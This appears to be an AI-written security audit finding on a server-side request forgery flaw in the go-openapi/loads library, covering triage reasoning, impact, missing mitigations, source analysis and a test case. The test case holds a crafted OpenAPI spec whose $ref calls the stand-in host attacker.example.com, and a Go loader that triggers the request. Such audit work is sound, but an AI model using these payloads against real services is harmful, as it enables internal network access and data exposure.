Based on the provided vulnerability description and the instructions, the vulnerability should be included in the updated list.

Here's why and the updated list in markdown format:

**Analysis of the vulnerability against the exclusion criteria:**

*   **Caused by developers explicitly using insecure code patterns when using project from PROJECT FILES:** This vulnerability is inherent in the design of the `go-openapi/loads` library, specifically how it handles external `$ref` in OpenAPI specifications. It's not due to a developer misusing the library by writing insecure code. The library's default behavior of resolving external URLs without proper validation creates the vulnerability.
*   **Only missing documentation to mitigate:** The described missing mitigations are code-level changes (input validation, URL scheme restrictions, disabling external refs, whitelisting, timeouts), not just documentation updates.  Implementing these mitigations requires modifying the library's code, not just documenting existing features.
*   **Deny of service vulnerabilities:** The described impact is focused on information disclosure, internal network scanning, and access to internal APIs. While SSRF *can* be used for DoS in some scenarios, the primary impact described here aligns with information security risks, not DoS.

**Analysis of the vulnerability against the inclusion criteria:**

*   **Valid and not already mitigated:** The description explicitly states "Currently Implemented Mitigations: None" and lists "Missing Mitigations," indicating the vulnerability is valid and not mitigated in the current version of the library.
*   **Vulnerability rank at least: high:** The vulnerability rank is stated as "High," meeting the criteria.

**Conclusion:**

The "Server-Side Request Forgery (SSRF) via External $ref in OpenAPI Specification" vulnerability meets the inclusion criteria and does not meet the exclusion criteria. Therefore, it should be included in the updated vulnerability list.

### Vulnerability List

- Vulnerability Name: Server-Side Request Forgery (SSRF) via External $ref in OpenAPI Specification
- Description:
    1. An attacker crafts a malicious OpenAPI specification document (YAML or JSON).
    2. In this specification, the attacker includes an external `$ref` field that points to a URL under their control or to an internal resource.
    3. The application using `go-openapi/loads` library loads and parses this malicious specification using `loads.Spec()` or similar functions.
    4. When the application attempts to expand the specification using `doc.Expanded()`, the `go-openapi/loads` library, through its dependency `go-openapi/spec`, resolves the external `$ref`.
    5. The library makes an HTTP GET request to the URL specified in the `$ref` field without proper validation or sanitization.
    6. If the URL points to an external attacker-controlled server, the attacker can observe the incoming request, confirming the SSRF vulnerability.
    7. If the URL points to an internal resource, the attacker might be able to access or interact with internal services, depending on network configuration and application context.
- Impact:
    - Information Disclosure: An attacker can potentially access sensitive information from internal network resources or the local file system if the application server has access.
    - Internal Network Scanning: The attacker can use the application server to scan internal network ports and identify running services.
    - Access to Internal APIs: The attacker might gain unauthorized access to internal APIs and functionalities.
    - Data Exfiltration: In some scenarios, the attacker could exfiltrate data by sending it to an external server they control.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
    - None. The provided code in `go-openapi/loads` does not implement any specific mitigations against SSRF when resolving external `$ref` URLs. It relies on the default behavior of the `go-openapi/spec` library and standard Go HTTP client, which will follow external URLs.
- Missing Mitigations:
    - Input validation and sanitization of `$ref` URLs to restrict allowed characters and prevent injection of malicious URLs.
    - Restricting the allowed schemes for external URLs to `http` and `https` only, and potentially blocking other schemes like `file://`, `gopher://`, etc.
    - Implementing an option to completely disable external `$ref` resolution, especially for environments where external references are not expected or desired.
    - Introducing a whitelist of allowed external domains or a deny-list of blocked domains for `$ref` URLs to limit the scope of external requests.
    - Setting timeouts for HTTP requests made to resolve external `$ref` URLs to prevent slow requests from causing delays or resource exhaustion.
- Preconditions:
    - The application must use the `go-openapi/loads` library to load and expand OpenAPI specifications.
    - The application must allow loading specifications that can contain external `$ref` URLs, and these specifications must be either provided by or influenced by potentially malicious external actors.
- Source Code Analysis:
    1. The `Spec()` function in `/code/spec.go` is used to load an OpenAPI specification from a given path.
    2. The `Expanded()` function in `/code/spec.go` is responsible for expanding `$ref` references within the specification. This function calls `spec.ExpandSpec()` from the `go-openapi/spec` library.
    3. The `spec.ExpandSpec()` function, as part of its operation, needs to resolve both internal and external `$ref`s. For external `$ref`s, it utilizes a `PathLoader` function.
    4. In `/code/loaders.go`, the `loaders` variable is initialized as a chain of loaders. Importantly, `spec.PathLoader` is set to `loaders.Load`. This means `go-openapi/loads` is configuring the default path loader for `go-openapi/spec`.
    5. The `loaders.Load()` function in `/code/loaders.go` iterates through the chain of registered loaders to find one that can handle the given path. The default loader chain includes `JSONDoc` and `YAMLDoc`.
    6. The `JSONDoc()` function in `/code/loaders.go` uses `swag.LoadFromFileOrHTTP(path)` to load the document content.
    7. Examining `swag.LoadFromFileOrHTTP()` in the `github.com/go-openapi/swag` library, it's evident that this function handles both file paths and HTTP URLs. When it detects a URL, it uses `http.Get()` to fetch the content.
    8. There is no explicit input validation, sanitization, or restriction on the URLs being fetched in the provided code of `go-openapi/loads`. The library directly uses the provided URL in the `$ref` to make an HTTP request. This absence of security measures allows for SSRF if an attacker can inject a malicious external URL into a `$ref` field within an OpenAPI specification that is processed by the application.

- Security Test Case:
    1. **Attacker Setup**:
        - Set up an HTTP listener on `http://attacker.example.com:8000`. This can be done using Python's `http.server` as described in the thought process, or any other method to log incoming HTTP requests.
    2. **Malicious Specification Creation**:
        - Create a YAML file named `malicious_spec.yaml` with the following content:
        ```yaml
        swagger: "2.0"
        info:
          version: "1.0.0"
          title: SSRF Test Spec
        paths:
          /test:
            get:
              responses:
                '200':
                  description: Success
                  schema:
                    $ref: 'http://attacker.example.com:8000/ssrf.json'
        ```
    3. **Application Execution**:
        - Prepare a Go program (e.g., `main.go`) that uses `go-openapi/loads` to load and expand the `malicious_spec.yaml`:
        ```go
        package main

        import (
            "fmt"
            "log"
            "github.com/go-openapi/loads"
        )

        func main() {
            doc, err := loads.Spec("malicious_spec.yaml")
            if err != nil {
                log.Fatalf("Failed to load spec: %v", err)
            }
            _, err = doc.Expanded()
            if err != nil {
                log.Printf("Error during expansion (expected if attacker server doesn't respond with valid JSON): %v", err)
            }
            fmt.Println("Spec loaded and expansion attempted. Check attacker server logs.")
        }
        ```
    4. **Run Test**:
        - Start the attacker's HTTP listener on `http://attacker.example.com:8000`.
        - Run the Go program: `go run main.go`
    5. **Verification**:
        - Check the logs of the attacker's HTTP listener. If the listener receives an incoming HTTP GET request, it confirms that the `go-openapi/loads` library attempted to access the external URL specified in the `$ref`. This demonstrates the SSRF vulnerability. The source IP in the attacker's logs should be the IP address of the machine running the Go program.
